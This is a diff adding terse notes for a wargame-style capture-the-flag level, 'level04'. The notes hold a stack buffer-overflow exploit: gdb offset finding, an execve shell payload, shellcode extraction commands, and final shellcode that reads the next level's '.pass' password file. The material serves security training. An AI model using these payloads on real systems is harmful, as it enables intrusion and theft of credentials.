@@ -1,0 +1,27 @@
+python -c "print('a' * 156 + 'AABB' )" > /tmp/sol4
+
+cat /tmp/sol4 - | gdb -ex "set follow-fork-mode child" -ex run ./level04
+    Program received signal SIGSEGV, Segmentation fault.
+    [Switching to process 1795]
+    0x42424141 in ?? ()
+
+    :info registers
+        edx            0xffffd670       -10640
+    :x/s 0xffffd670
+        0xffffd670:      'a' <repeats 156 times>, "AABB"
+
+0xffffd670 + 40(0x28) =  0xffffd698
+
+python -c "print( 40 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'a' * 91 + '\x98\xd6\xff\xff')" > /tmp/sol4
+
+cat /tmp/sol4 - | ./level04
+    Give me some shellcode, k
+    no exec() for you
+
+nasm -felf32 shellcode.s -o shellcode.o
+ld -m elf_i386 shellcode.o -o shellcode
+objdump -M intel -d ./shellcode | grep '[0-9a-fA-F]*:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
+
+python -c "print( 40 * '\x90' + '\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x35\x2f\x2f\x2e\x68\x76\x65\x6c\x30\x68\x2f\x2f\x6c\x65\x68\x73\x65\x72\x73\x68\x65\x2f\x2f\x75\x68\x2f\x68\x6f\x6d\x89\xe3\x50\x31\xc9\xb0\x05\xcd\x80\x89\xc3\xb0\x03\x8d\x4c\x24\x29\xb2\x29\xcd\x80\xb0\x04\xb3\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80' + 'a' * 45 + '\x98\xd6\xff\xff')" > /tmp/sol4
+
+cat /tmp/sol4 | ./level04
